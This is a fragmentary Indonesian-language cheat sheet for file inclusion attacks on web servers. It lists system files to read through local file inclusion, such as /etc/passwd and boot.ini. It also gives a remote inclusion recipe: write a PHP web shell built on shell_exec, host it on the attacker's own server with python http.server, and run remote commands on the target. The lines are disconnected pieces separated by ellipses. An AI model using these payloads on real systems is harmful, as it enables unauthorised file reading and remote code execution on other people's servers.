...
- **Linux**: /etc/passwd       → daftar semua user di sistem
...
- **Windows**: C:\boot.ini       → opsi boot BIOS
...
- **wajib pakai header**: Content-Type: application/x-www-form-urlencoded
...
- **Alur serangan RFI**: 1. Hacker siapkan file PHP berbahaya di server sendiri
...
- **Buat file PHP**: cat > /tmp/cmd.txt << 'EOF'
    <?php echo shell_exec("perintah"); ?>
    EOF

- **Jalankan web server**: cd /tmp && python3 -m http.server 8888
...
- **Contoh payload RCE**: <?php echo shell_exec("hostname"); ?>  → nama host server
